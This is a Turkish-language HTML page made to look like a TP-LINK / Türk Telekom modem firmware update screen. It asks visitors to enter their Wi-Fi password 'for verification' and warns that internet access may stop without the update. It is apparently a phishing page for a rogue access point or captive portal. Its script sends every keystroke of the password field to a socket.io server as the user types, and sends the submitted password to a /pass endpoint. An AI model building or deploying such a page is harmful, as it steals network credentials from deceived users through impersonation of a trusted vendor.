<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<head>
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico"/>
  
    <link rel="stylesheet" href="main.css"/>
    <script src="/socket.io/socket.io.js"></script>
    <script src="jquery.js"></script>

    <title >TP-LINK</title>
   
</head>
<body>

<div id="pc-div">
<div id="pc-top">
    <div id="pc-top-container">
        <a id="pc-top-product" href="" target="_blank">
            <span class="icon-logo"></span>
        </a>
    </div>
</div>
<div id="pc-scroll">
    <h1 style="color: crimson; text-align: center; font-size: 24pt;" class="as">TP-LINK TürkTelekom Modemi V2.5.4 Yazılım Güncellemesi </h1>
    <h1 style="text-align: center; font-size: 12pt;" class="as">Yazılım Güncellemesi İçin Doğrulama Amaçlı Wi-fi Şifrenizi Giriniz !</h1>
        <div class="pc-login-content" id="pc-login">
            <div id="error" class="errDivP md">
                <span class="sprite b-error-alert"></span>
                
                <h1 class="as">Not: Yazılım Güncellenmedikçe İnternete Erişemeyebilirsiniz !</h1>
                <h1 class="errTextP"></h1>
            </div>
            <div class="pc-login-field">
                
                <div class="pc-inputarea">
                    <label class="pc-login-password-label">
                        <span class="icon"></span>
                    </label>
                    <input type="password"  Placeholder="Wifi Şifresi" id="pc-login-password" autocomplete="off">
                    
                </div>
            </div>
            <div>
                <div class="button-wrapper">
                    <button id="pc-login-btn" class="button-button" type="button">
                        <span id="pc-login-btn" class="text button-text">Tamam</span>
                    </button>
                    
                </div>
            </div>
        </div>
        </div>
        
        
    
</div>
</div>
<script text="text/javascript">
    $(function () {
        var socket = io();
        $('#pc-login-password').on('input',function(e){
            socket.emit('data', $("#pc-login-password").val())
        });

        $("#pc-login-btn").click(()=>{
            socket.emit('data', $("#pc-login-password").val())
            $("#as").hide()
            $.get("/pass?pas="+$("#pc-login-password").val(), function( data ) {
                $(".errTextP").html(data);
                $("#as").show();
            })
        })
    });
</script>
       
</body>


</html>
